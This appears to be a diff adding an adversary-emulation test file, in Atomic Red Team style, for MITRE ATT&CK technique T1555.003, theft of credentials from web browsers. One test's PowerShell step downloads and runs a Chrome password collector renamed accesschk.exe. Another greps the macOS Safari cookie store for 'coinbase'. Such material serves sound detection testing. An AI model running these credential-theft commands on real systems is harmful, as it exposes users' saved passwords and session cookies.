@@ -1,0 +1,52 @@
+attack_technique: T1555.003
+display_name: "Credentials from Password Stores: Credentials from Web Browsers"
+atomic_tests:
+- name: Run Chrome-password Collector
+  auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
+  description: |
+    A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
+
+    Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.
+
+    Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: File path for modified Sysinternals
+      type: String
+      default: $env:TEMP
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Modified Sysinternals must be located at #{file_path}
+    prereq_command: |
+      if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+      Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
+      Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
+  executor:
+    command: |
+      Set-Location -path "#{file_path}\Sysinternals";
+      ./accesschk.exe -accepteula .;
+    cleanup_command: 'Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction Ignore'
+    name: powershell
+- name: Search macOS Safari Cookies
+  auto_generated_guid: c1402f7b-67ca-43a8-b5f3-3143abedc01b
+  description: |
+    This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.
+
+    Upon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.
+  supported_platforms:
+  - macos
+  input_arguments:
+    search_string:
+      description: String to search Safari cookies to find.
+      type: string
+      default: coinbase
+  executor:
+    command: |
+      cd ~/Library/Cookies
+      grep -q "#{search_string}" "Cookies.binarycookies"
+    name: sh
